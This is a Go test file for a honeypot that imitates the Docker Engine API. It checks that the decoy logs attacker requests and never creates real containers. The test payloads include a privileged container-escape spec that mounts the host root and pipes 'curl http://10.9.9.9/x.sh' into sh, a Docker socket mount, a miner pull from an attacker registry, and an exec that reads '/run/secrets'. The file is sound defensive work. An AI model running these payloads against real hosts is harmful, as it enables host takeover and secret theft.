package dockersvc

import (
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"testing"

	"github.com/willysnow/wisp/internal/service"
	"github.com/willysnow/wisp/internal/service/servicetest"
)

func start(t *testing.T) (*servicetest.StreamHarness, string) {
	t.Helper()

	h := servicetest.StartStream(t, func(addr string) service.StreamService {
		return New(addr, "24.0.7", "1.43")
	})
	return h, "http://" + h.Addr
}

func do(t *testing.T, req *http.Request) (*http.Response, string) {
	t.Helper()

	client := &http.Client{Transport: &http.Transport{Proxy: nil}}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", req.Method, req.URL, err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read body: %v", err)
	}
	return resp, string(body)
}

func get(t *testing.T, url string) (*http.Response, string) {
	t.Helper()

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		t.Fatalf("request: %v", err)
	}
	return do(t, req)
}

func post(t *testing.T, url, body string, header map[string]string) (*http.Response, string) {
	t.Helper()

	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(body))
	if err != nil {
		t.Fatalf("request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	for k, v := range header {
		req.Header.Set(k, v)
	}
	return do(t, req)
}

// TestContainerEscapeSpecIsCaptured is what the decoy exists for.
//
// A specification is a written-down plan, and this one says the whole thing:
// mount the host's root filesystem, take every capability, then chroot into it.
// Nobody does that by accident, which is why the event has to carry the spec
// and not just the fact that /containers/create was called.
func TestContainerEscapeSpecIsCaptured(t *testing.T) {
	h, base := start(t)

	post(t, base+"/v1.43/containers/create?name=updater", `{
		"Image": "alpine:3.19",
		"Cmd": ["chroot", "/host", "sh", "-c", "curl -s http://10.9.9.9/x.sh | sh"],
		"HostConfig": {"Binds": ["/:/host"], "Privileged": true, "PidMode": "host"}
	}`, nil)

	ev := h.WaitFor(t, "container_create")

	if img, _ := ev.Data["image"].(string); img != "alpine:3.19" {
		t.Errorf("image = %q, want alpine:3.19", img)
	}
	if cmd, _ := ev.Data["cmd"].(string); !strings.Contains(cmd, "x.sh | sh") {
		t.Errorf("cmd = %q, want the command they were going to run", cmd)
	}
	if binds, _ := ev.Data["binds"].(string); !strings.Contains(binds, "/:/host") {
		t.Errorf("binds = %q, want the host mount", binds)
	}
	if ev.Data["privileged"] != true {
		t.Errorf("privileged = %v, want true", ev.Data["privileged"])
	}
	if ev.Data["name"] != "updater" {
		t.Errorf("name = %v, want the name they chose", ev.Data["name"])
	}

	escape, _ := ev.Data["escape"].(string)
	for _, want := range []string{"host_filesystem", "privileged", "host_pid"} {
		if !strings.Contains(escape, want) {
			t.Errorf("escape = %q, missing %q", escape, want)
		}
	}
}

// TestOrdinaryContainerIsNotFlaggedAsAnEscape.
//
// `escape` is only worth having if its absence means something. A field that
// appears on every container spec would be one more thing for an analyst to
// ignore.
func TestOrdinaryContainerIsNotFlaggedAsAnEscape(t *testing.T) {
	h, base := start(t)

	post(t, base+"/v1.43/containers/create", `{
		"Image": "nginx:1.25",
		"HostConfig": {"Binds": ["/srv/www:/usr/share/nginx/html:ro"], "NetworkMode": "bridge"}
	}`, nil)

	ev := h.WaitFor(t, "container_create")
	if escape, ok := ev.Data["escape"]; ok {
		t.Errorf("escape = %v on an ordinary container spec", escape)
	}
}

// TestDockerSocketMountIsRecognised. A container holding the daemon's own
// socket can create the next container, so it is the same escape one step
// removed — and it is the form that gets past a reviewer looking for `/:/host`.
func TestDockerSocketMountIsRecognised(t *testing.T) {
	h, base := start(t)

	post(t, base+"/containers/create", `{
		"Image": "docker:cli",
		"HostConfig": {"Mounts": [
			{"Type": "bind", "Source": "/var/run/docker.sock", "Target": "/var/run/docker.sock"}
		]}
	}`, nil)

	ev := h.WaitFor(t, "container_create")
	if escape, _ := ev.Data["escape"].(string); !strings.Contains(escape, "docker_socket") {
		t.Errorf("escape = %q, want docker_socket", escape)
	}
}

// TestRegistryCredentialIsDecoded. X-Registry-Auth carries a real username and
// password in the clear, and it is usually the intruder's own account — the one
// their tooling lives in.
//
// The event stays a `write_request` rather than becoming a `login_basic`: a
// pull already names what is being brought onto the host, and that is the more
// specific description of what happened. The credential rides along in the
// data, where an operator searching for a username still finds it.
func TestRegistryCredentialIsDecoded(t *testing.T) {
	h, base := start(t)

	auth := base64.URLEncoding.EncodeToString([]byte(
		`{"username":"buildbot","password":"S3cret-Pull","serveraddress":"registry.attacker.example"}`))
	post(t, base+"/v1.43/images/create?fromImage=registry.attacker.example/miner&tag=latest",
		"", map[string]string{"X-Registry-Auth": auth})

	ev := h.WaitFor(t, "write_request")
	if ev.Data["username"] != "buildbot" || ev.Data["password"] != "S3cret-Pull" {
		t.Errorf("credential = %v/%v, want the decoded pair", ev.Data["username"], ev.Data["password"])
	}
	if ev.Data["registry"] != "registry.attacker.example" {
		t.Errorf("registry = %v, want where they were pulling from", ev.Data["registry"])
	}
	if img, _ := ev.Data["image"].(string); !strings.Contains(img, "miner") {
		t.Errorf("image = %q, want the image being pulled", img)
	}
}

// TestExecCommandIsCaptured. Exec into a container that already exists is the
// quieter route to the same place, and the command is still the artifact.
func TestExecCommandIsCaptured(t *testing.T) {
	h, base := start(t)

	post(t, base+"/v1.43/containers/payments-api/exec",
		`{"Cmd":["sh","-c","cat /run/secrets/*"],"User":"root","AttachStdout":true}`, nil)

	ev := h.WaitFor(t, "command")
	if cmd, _ := ev.Data["cmd"].(string); !strings.Contains(cmd, "cat /run/secrets/*") {
		t.Errorf("cmd = %q, want the command they submitted", cmd)
	}
	if ev.Data["container"] != "payments-api" {
		t.Errorf("container = %v, want the one they picked", ev.Data["container"])
	}
}

// TestVersionedAndUnversionedPathsBothAnswer. Docker clients prefix every
// request with the API version they negotiated; curl users and half the
// scanners do not. A decoy that understood one form would answer half its
// visitors and 404 the rest.
func TestVersionedAndUnversionedPathsBothAnswer(t *testing.T) {
	_, base := start(t)

	for _, path := range []string{"/containers/json", "/v1.43/containers/json", "/v1.24/containers/json"} {
		resp, body := get(t, base+path)
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("%s returned %d, want 200", path, resp.StatusCode)
		}

		var list []map[string]any
		if err := json.Unmarshal([]byte(body), &list); err != nil {
			t.Fatalf("%s is not a container list: %v", path, err)
		}
		if len(list) == 0 {
			t.Errorf("%s is empty — a host with nothing on it is not worth a second packet", path)
		}
	}
}

// TestNothingIsActuallyCreated. Every reply is fabricated from the request, and
// the daemon's inventory has to stay exactly as fictional as it started.
func TestNothingIsActuallyCreated(t *testing.T) {
	_, base := start(t)

	_, before := get(t, base+"/containers/json")

	for i := 0; i < 3; i++ {
		resp, body := post(t, base+"/containers/create", `{"Image":"alpine:3.19"}`, nil)
		if resp.StatusCode != http.StatusCreated {
			t.Fatalf("create returned %d, want 201", resp.StatusCode)
		}
		var created struct{ Id string }
		if err := json.Unmarshal([]byte(body), &created); err != nil || created.Id == "" {
			t.Fatalf("create returned no usable Id: %q", body)
		}
		post(t, base+"/containers/"+created.Id+"/start", "", nil)
	}

	if _, after := get(t, base+"/containers/json"); after != before {
		t.Error("the container list changed — something was actually created")
	}
}

// TestPingIdentifiesTheDaemon. /_ping is the first call every client and every
// scanner makes, and the answer is in the headers rather than the two-letter
// body.
func TestPingIdentifiesTheDaemon(t *testing.T) {
	h, base := start(t)

	resp, body := get(t, base+"/_ping")
	if resp.StatusCode != http.StatusOK || body != "OK" {
		t.Fatalf("/_ping = %d %q, want 200 OK", resp.StatusCode, body)
	}
	if got := resp.Header.Get("Api-Version"); got != "1.43" {
		t.Errorf("Api-Version = %q, want 1.43", got)
	}
	if got := resp.Header.Get("Server"); !strings.HasPrefix(got, "Docker/24.0.7") {
		t.Errorf("Server = %q, want a Docker daemon", got)
	}

	h.WaitFor(t, "probe")
}

// TestInfoAdmitsTheApiIsInTheClear. A real daemon listening on 2375 prints
// exactly this warning, and the intruder already knows — they are the one who
// connected. Omitting it would be the tell.
func TestInfoAdmitsTheApiIsInTheClear(t *testing.T) {
	_, base := start(t)

	_, body := get(t, base+"/v1.43/info")

	var info struct{ Warnings []string }
	if err := json.Unmarshal([]byte(body), &info); err != nil {
		t.Fatalf("/info is not JSON: %v", err)
	}
	if !strings.Contains(strings.Join(info.Warnings, " "), "without encryption") {
		t.Errorf("Warnings = %v, want the unencrypted-API warning", info.Warnings)
	}
}
